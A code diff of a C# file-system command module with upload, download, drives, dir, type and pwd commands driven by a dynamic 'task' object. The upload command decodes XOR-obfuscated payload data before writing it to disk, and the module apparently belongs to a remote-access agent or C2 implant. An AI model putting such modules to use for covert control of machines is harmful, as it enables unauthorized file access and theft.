@@ -8,10 +8,10 @@ namespace FileSystem
     {
         public string Name => "upload";
 
-        public string Execute(string[] args)
+        public string Execute(dynamic task)
         {
-            byte[] upstream_data = Zor(Convert.FromBase64String(args[0]), args[1]);
-            string upload_path = args[2];
+            byte[] upstream_data = Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]);
+            string upload_path = task.Params[2];
             File.WriteAllBytes(upload_path, upstream_data);
             return "Wrote " + upstream_data.Length.ToString() + " bytes to: " + upload_path;
         }
@@ -32,9 +32,9 @@ namespace FileSystem
     {
         public string Name => "download";
 
-        public byte[] Execute(string[] args)
+        public byte[] Execute(dynamic task)
         {
-            string download_path = args[0];
+            string download_path = task.Params[0];
             byte[] result = File.ReadAllBytes(download_path);
             return result;
         }
@@ -44,7 +44,7 @@ namespace FileSystem
     {
         public string Name => "drives";
 
-        public string Execute(string[] args)
+        public string Execute(dynamic task)
         {
             StringBuilder result = new StringBuilder();
 
@@ -73,29 +73,20 @@ namespace FileSystem
     {
         public string Name => "dir";
 
-        public string Execute(string[] args)
+        public string Execute(dynamic task)
         {
             StringBuilder result = new StringBuilder();
             string directory = Directory.GetCurrentDirectory();
-            if (args.Length > 0)
+            if (task.Length > 0)
             {
-                directory = args[0];
-            }
-
-            if (!Directory.Exists(directory))
-            {
-                return $"Directory not found: {args[0]}";
+                directory = task.Params[0];
             }
 
             result.AppendLine($" Directory of {directory}");
             string[] directories;
-            try
-            {
-                directories = Directory.GetDirectories(directory);
-            } catch (UnauthorizedAccessException)
-            {
-                return $"Permission Denied: {directory}";
-            }
+
+            directories = Directory.GetDirectories(directory);
+
 
             foreach (string dir in directories)
             {
@@ -111,16 +102,8 @@ namespace FileSystem
                 }
             }
 
-
             string[] files;
-            try
-            {
-                files = Directory.GetFiles(directory);
-            }
-            catch (UnauthorizedAccessException)
-            {
-                return $"Permission Denied: {directory}";
-            }
+            files = Directory.GetFiles(directory);
 
             foreach (string file in files)
             {
@@ -144,20 +127,19 @@ namespace FileSystem
     {
         public string Name => "type";
 
-        public string Execute(string[] args)
+        public string Execute(dynamic task)
         {
-            try
-            {
-                return File.ReadAllText(args[0]);
-            }
-            catch (UnauthorizedAccessException)
-            {
-                return $"Permission Denied: {args[0]}";
-            }
-            catch (FileNotFoundException)
-            {
-                return $"File {args[0]} does not exist";
-            }
+             return File.ReadAllText(task.Params[0]);
+        }
+    }
+
+    public class PwdCommand
+    {
+        public string Name => "pwd";
+
+        public string Execute(dynamic task)
+        {
+            return Directory.GetCurrentDirectory();
         }
     }
 }
